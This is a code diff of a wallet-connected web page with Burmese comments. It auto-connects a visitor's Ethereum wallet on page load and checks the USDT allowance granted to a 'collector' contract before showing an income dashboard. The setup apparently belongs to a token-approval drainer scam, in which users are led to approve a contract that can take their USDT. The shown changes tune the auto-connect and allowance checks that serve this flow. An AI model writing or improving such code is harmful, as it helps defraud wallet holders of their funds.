@@ -266,10 +266,12 @@
             updateQRCode(defaultLink);
             generateIncomeList();
             startLiveCalculatingStats();
-            checkAutoConnect();
+            
+            // Page ဖွင့်ဖွင့်ချင်း အလိုအလျောက် Wallet ချိတ်ဆက်မှုနှင့် Allowance ကို စစ်ဆေးရန်
+            setTimeout(checkAutoConnect, 800);
         });
 
-        // Auto-connect နှင့် Signer ကို အလိုအလျောက် သတ်မှတ်ပေးခြင်း
+        // ဝင်ရောက်လာစဉ် Wallet ချိတ်ဆက်ပြီးသားနှင့် Allowance ရှိပြီးသားဖြစ်ပါက အလိုအလျောက် Dashboard ပြရန်
         async function checkAutoConnect() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -281,6 +283,7 @@
 
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         
+                        // Allowance ကို အလိုအလျောက် စစ်ဆေးခြင်း
                         await checkExistingAllowanceAndLoad();
                     }
                 } catch (err) {
@@ -295,6 +298,7 @@
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
+                    // Approve ပြီးသားဖြစ်ပါက ခလုတ်ကို Connected & Approved သို့ပြောင်းပြီး Dashboard တင်ရန်
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
                     document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                     
@@ -345,6 +349,7 @@
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
+                // ပထမဦးစွာ Allowance ရှိမရှိ အရင်စစ်ဆေးပါ (Approve ပြီးသားဆိုရင် ထပ်တောင်းစရာမလိုတော့ပါ)
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
